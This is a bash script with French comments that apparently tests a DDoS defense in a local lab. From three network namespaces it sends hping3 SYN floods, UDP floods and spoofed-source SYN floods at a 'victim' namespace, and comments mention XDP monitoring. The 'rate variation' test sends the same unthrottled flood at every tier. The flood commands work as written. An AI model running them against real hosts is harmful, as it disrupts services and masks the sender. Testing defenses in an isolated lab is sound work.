#!/bin/bash

# Paramètres
VICTIM_NS="victim"
VICTIM_IP="10.0.0.1"
BOT_COUNT=3
BASE_BOT_NS="bot"
TARGET_PORT=80
LOG_DIR="./logs"
TEST_DURATION=10  # Durée en secondes pour chaque test

# Couleurs
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
RED='\033[0;31m'
NC='\033[0m'

# Créer un dossier pour les logs
mkdir -p "$LOG_DIR"

# Nettoyage complet (fin du script ou interruption)
cleanup() {
    echo -e "${YELLOW}[*] Nettoyage final...${NC}"
    for pid in "${PIDS[@]}"; do
        kill "$pid" 2>/dev/null
    done
    exit 0
}
trap cleanup SIGINT SIGTERM

# Fonction pour arrêter les attaques entre les tests sans quitter le script
stop_attack() {
    echo -e "${YELLOW}[*] Arrêt de l'attaque en cours...${NC}"
    for pid in "${PIDS[@]}"; do
        kill "$pid" 2>/dev/null
    done
    PIDS=()
}

# Vérification des dépendances
for cmd in ip hping3; do
    if ! command -v "$cmd" &>/dev/null; then
        echo -e "${RED}[!] Erreur : $cmd est requis.${NC}"
        exit 1
    fi
done

# === Test 1 : Trafic normal (TCP ping) ===

echo -e "${YELLOW}[1/5] Test : Trafic normal (packets légitimes)${NC}"
for i in $(seq 1 $BOT_COUNT); do
    NS="${BASE_BOT_NS}${i}"
    ip netns exec "$NS" hping3 -c 5 -S -p "$TARGET_PORT" "$VICTIM_IP" 2>&1 | while read -r line; do
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $line" | tee -a "$LOG_DIR/test1.log"
done
done
sleep 2

# === Test 2 : SYN Flood (DoS TCP) ===

# POUR VERIFIER PAQUETS : DANS TERMINAL : sudo ip netns exec victim tcpdump -i veth-victim tcp port 80

#--flood supprime l'affichage des réponses pour maximiser le débit :
#hping3 entre en "mode silencieux" pour envoyer un maximum de paquets rapidement.
#Il n'affiche aucun paquet reçu, même s'il y en a.

echo -e "${YELLOW}[2/5] Test : DDoS SYN flood${NC}"
PIDS=()
for i in $(seq 1 $BOT_COUNT); do
    NS="${BASE_BOT_NS}${i}"
    ip netns exec "$NS" hping3 -S --flood -p "$TARGET_PORT" "$VICTIM_IP" > "$LOG_DIR/syn_flood_${NS}.log" 2>&1 &
    PIDS+=($!)
done
sleep "$TEST_DURATION"
stop_attack

# === Test 3 : UDP Flood ===

# POUR VERIFIER PAQUETS : DANS TERMINAL : sudo ip netns exec victim tcpdump -i veth-victim udp port 53

#UDP est un protocole sans connexion (ne répond jamais) → il n’y a aucune réponse attendue.
#hping3 n’affiche pas les paquets envoyés, seulement les réponses.
#Donc pas de "paquet reçu" ≠ échec, c’est simplement silencieux.
#A regarder avec programme python et maps xdp

echo -e "${YELLOW}[3/5] Test : DDoS UDP flood (port 53)${NC}"
PIDS=()
for i in $(seq 1 $BOT_COUNT); do
    NS="${BASE_BOT_NS}${i}"
    ip netns exec "$NS" hping3 --udp --flood -p 53 "$VICTIM_IP" > "$LOG_DIR/udp_flood_${NS}.log" 2>&1 &
    PIDS+=($!)
done
sleep "$TEST_DURATION"
stop_attack

# === Test 4 : Variation d’intensité (10k, 100k, 1M pps simulé) ===

# POUR VERIFIER PAQUETS : DANS TERMINAL : sudo ip netns exec victim tcpdump -i veth-victim tcp port 80

#--flood inonde et désactive l'affichage.
#L'absence d'affichage ne signifie pas que rien n’est envoyé.
#Le terminal reste silencieux pour des raisons de performance.
#A regarder avec programme python et maps xdp

echo -e "${YELLOW}[4/5] Test : Variation d’intensité${NC}"
RATES=(100 1000 10000)
for RATE in "${RATES[@]}"; do
    echo -e "${GREEN}[*] Envoi à environ $RATE pps (simulation)${NC}"
    PIDS=()
    for i in $(seq 1 $BOT_COUNT); do
        NS="${BASE_BOT_NS}${i}"
        ip netns exec "$NS" hping3 -S --flood -p "$TARGET_PORT" "$VICTIM_IP" > "$LOG_DIR/saturation_${RATE}_pps_${NS}.log" 2>&1 &
        PIDS+=($!)
    done
    sleep "$TEST_DURATION"
    stop_attack
done

# === Test 5 : Multi-source (IP spoofing) ===

# POUR VERIFIER PAQUETS : DANS TERMINAL : sudo ip netns exec victim tcpdump -i veth-victim src net 192.168.0.0/16

#On spoof l'adresse source : la victime ne peut pas répondre.
# IP source = pas de réponses.
#Comme hping3 ne montre que les réponses, tu n’as aucun retour.
#C’est prévu par le design même du test.
#A regarder avec programme python et maps xdp

echo -e "${YELLOW}[5/5] Test : Multi-source avec IP spoofing${NC}"
PIDS=()
for i in $(seq 1 $BOT_COUNT); do
    NS="${BASE_BOT_NS}${i}"
    SPOOFED_SRC="192.168.$i.$((RANDOM%254+1))"
    echo -e "${GREEN}[*] Bot $NS spoofe IP source $SPOOFED_SRC${NC}"
    ip netns exec "$NS" hping3 -S --flood -a "$SPOOFED_SRC" -p "$TARGET_PORT" "$VICTIM_IP" > "$LOG_DIR/spoofed_${NS}.log" 2>&1 &
    PIDS+=($!)
done
sleep "$TEST_DURATION"
stop_attack

echo -e "${GREEN}[✓] Tous les tests sont terminés. Résultats dans $LOG_DIR${NC}"
